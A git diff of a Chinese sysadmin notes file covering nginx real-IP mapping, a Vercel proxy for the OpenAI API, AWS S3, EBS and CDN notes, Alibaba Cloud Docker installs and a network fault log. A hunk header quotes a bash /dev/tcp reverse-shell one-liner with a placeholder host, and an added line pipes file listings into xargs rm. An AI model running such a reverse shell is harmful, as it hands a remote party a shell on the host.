@@ -161,11 +161,11 @@ bash -i >& /dev/tcp/<被控端ip>/65535 0>&1
 # nginx 获取cdn真实用户ip 
 ```conf
 # client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
-  map $http_x_forwarded_for  $client_real_ip {
-      ""  $remote_addr;
-      ~^(?P<firstAddr>[0-9\.]+),?.*$  $firstAddr;
-  }
-
+    map $http_x_forwarded_for $client_real_ip {
+    "" $remote_addr;
+    # fix: 兼容ipv6
+    ~^(?P<firstAddr>[0-9a-fA-F:.]+),?.*$ $firstAddr;
+    }
 ```
 
 # virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用 
@@ -563,18 +563,22 @@ GATEWAY0=<172.16.31.1>
     - 上诉步骤完成后，配置工作基本就算完成了，`cloudflare`会有一个默认的域名，但由于某些原因，可能访问效果不是很好，不过自定义域名可以解决，具体配置在`触发器`中。此处可以定义你自己想要设定的域名，不过，要定义自定义域名，你的域名`ns`需要指定到`cloudflare`中，后续内容自行研究。
 
 - `vercel` 反代`openai`
-```json
-// vercel.json -- cmd: vercel
-{
-    "rewrites": [
-        { "source": "/", "destination": "https://api.openai.com" },
-        {
-            "source": "/:match*",
-            "destination": "https://api.openai.com/:match*"
-        }
-    ]
-}
-```
+    ```json
+    // vercel.json -- cmd: vercel --prod
+    {
+        "rewrites": [
+            { "source": "/", "destination": "https://api.openai.com" },
+            {
+                "source": "/:match*",
+                "destination": "https://api.openai.com/:match*"
+            // },
+            // {
+            //    "source": "/openai/:match*",
+            //    "destination": "https://api.openai.com/:match*"
+            }
+        ]
+    }
+    ```
 
 
 
@@ -671,6 +675,7 @@ redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes
 ## find 文件性能提升
 ```bash
 # find 查询大量文件删除时会很慢，可以用ls 配合 grep 查询需要删除的文件，然后删除
+$> find /path/to/directory -type f -name "*.txt" -exec ls -l {} \; | grep "pattern" | xargs rm
 ```
 
 ## 压力测试 `ab`` 命令解释 
@@ -703,7 +708,8 @@ $> ab -n 5000 -c 50 -r http://www.example.com/
     - 打开`IIS`,找到 `Application Request Routing Cache`打开，点击右侧`Server Proxy Setings`,勾选 `Enable proxy`，点击右侧`应用`即可。
     - 打开`IIS`,选择网站, 打开 `URL Rewrite(URL 重写)`, 点击右侧`添加规则`，选择`空白规则`，模式配置`(.*)`,操作选择`重写`, 重写URL设置需要反向代理的地址, 例如: 需要代理到 `http://127.0.0.1:8080/`,则填写 `http://127.0.0.1:8080/{R:1}`，其他默认，保存即可。
 
-## 亚马逊存储桶  
+## 亚马逊存储桶
+***新建存储通无论是公开或私有，应优先考虑以下规则***    
 1. 创建存储桶(可公有访问权限)  
 2. 设置"对象所有权"为`ACL已启用`  
 3. 设置"对象所有权"为`存储桶拥有者优先`。  
@@ -713,3 +719,50 @@ $> ab -n 5000 -c 50 -r http://www.example.com/
 ```bash
 $> export PROMPT_COMMAND='echo -ne "\033]0; ${USER}@${HOSTNAME} \007"'
 ```
+
+## 阿里云安装 alinux 操作系统安装 docker
+```bash
+# aliyun的两个云镜像要安装docker都得安装一个兼容插件，否则在官方仓库中找不到对应的地址 
+## Alibaba Cloud Linux 2
+$> wget -O /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
+$> sudo yum install yum-plugin-releasever-adapter --disablerepo=* --enablerepo=plus     # 兼容插件
+
+## Alibaba Cloud Linux 3
+$> dnf config-manager --add-repo=https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
+$> sudo dnf -y install dnf-plugin-releasever-adapter --repo alinux3-plus    # 兼容插件
+```
+
+## 亚马逊cdn 添加 elb 作为后端源，指定多备用域名无效(有其他衍生问题, 待继续测试)   
+- 问题体现: 亚马逊添加`cdn`分配后，指向源站为`elb`，此时`cdn`配置多个备用域名，正常解析后，无论访问的是哪个备用域名，他们请求的最终站点始终是一个。
+- 问题分析: 
+    - 怀疑是`sni`的问题，`elb`和`cdn`这边所使用的证书都是通配符证书, 而在请求过程中，携带的`sni`只有主域名，而上述问题中请求到的最终站点，恰好又是`nginx`中配置的第一个。
+- 解决方案:
+    - 为每一个`cdn`备用域名添加一个独立的`cdn` 
+
+# 亚马逊调整 EBS 卷大小后扩展文件系统(磁盘扩容)
+```bash
+### https://docs.aws.amazon.com/zh_cn/ebs/latest/userguide/recognize-expanded-volume-linux.html
+
+## 1. 检查卷是否有分区
+$> sudo lsblk
+
+## 2. 扩展分区
+# $> sudo growpart 需要扩展的盘 1
+$> sudo growpart /dev/nvme0n1 1
+
+## 3. 扩展文件系统
+# xfs
+$> sudo xfs_growfs -d / 
+# ext4
+# $> sudo resize2fs <挂载分区名>
+$> sudo resize2fs /dev/nvme0n1p1
+```
+
+# 阿里云磁盘分区扩容
+
+> https://help.aliyun.com/zh/ecs/user-guide/step-2-resize-partitions-and-file-systems/?spm=a2c4g.11186623.0.0.5a193a8aP9JIh1  
+
+
+# 网络故障记录
+- `症状`：局域网机器网络故障，时好时坏。故障时候无法`ping`通网关(无法获取响应)，但可以`ping`通同网段的其他主机，也可以与其他主机正常通信。
+- `原因`：当前主机是通过手动配置`ip`，而局域网`ip`是路由自动分配的，有其他同事在连接时候占用了当前主机配置的`ip`，从而`ip`重复导致了上诉问题。
